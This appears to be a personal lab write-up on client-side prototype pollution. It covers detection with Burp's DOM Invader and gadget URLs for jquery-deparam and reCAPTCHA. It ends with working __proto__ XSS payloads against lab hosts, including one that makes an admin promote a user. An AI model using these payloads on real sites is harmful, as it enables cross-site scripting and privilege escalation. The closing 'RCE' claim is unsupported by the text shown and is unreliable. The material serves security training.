**Client-Side Proto Pollution**
This kind of attack happens where we are in a "Backbox" type of attack and we can't pollute the back-end so we need to do it in the front-end.

1)Automatic:
Use https://portswigger.net/burp/documentation/desktop/tools/dom-invader via native Burp-suite browser.
Activate the plugin, and under attack type choose **DOM** pollution.
This should identify all the available XSS pollution.

2)Manual:
In this example we can see that the PHP lab is loading several JS modules:
```
<!DOCTYPE html>

<html lang="en">
    <head>
        <SNIP>
        
        <script src="/jquery-deparam.js"></script>
        <script src="/purify.min.js"></script>
        <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    </head>
    <body>
        <SNIP>

        <script>
            let params = deparam(location.search.slice(1))
            let color = DOMPurify.sanitize(params.color);
            document.getElementById("form").style.backgroundColor = color;
      </script>
      </div>
    </body>
</html>
```
We can use this as reference:  https://github.com/BlackFan/client-side-prototype-pollution#prototype-pollution

Here can we identify that:
```
- jquery-deparam.js = ?__proto__[test]=test   OR 	?constructor[prototype][test]=test
- Google Recaptcha = ?__proto__[srcdoc][]=<script>alert(1)</script>
```


## LAB:
In our example we have only **JQuery 3.5.1** and **DomPurify 2.4.4** where apparently the only one that is vulnerable is JQuery.
Seems like we can use this payload: https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md#getscript-jquery--340
Which results in a success! 
http://83.136.252.32:45171/profile.php/profile.php?__proto__[src][]=data:,alert(1)//
Another alternative is: 
http://94.237.49.166:48704/profile.php?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
Trying to read **/admin** endpoint we can see the presence of promoting?
```
                   <td><a href="/admin.php?promote=1">Promote</a></td>
                </tr>
                <tr>
                    <td>htb-stdnt</td>
                    <td>User</td>
                    <td><a href="/admin.php?promote=2">Promote</a>
					
```
This should allow us to promote our user via a normal GET request sent to admin via XSS pollution!
http://94.237.49.166:48704/profile.php?__proto__[src][]=data:,src=http://94.237.49.166:48704/admin.php?promote=2//
(This should get us a RCE!)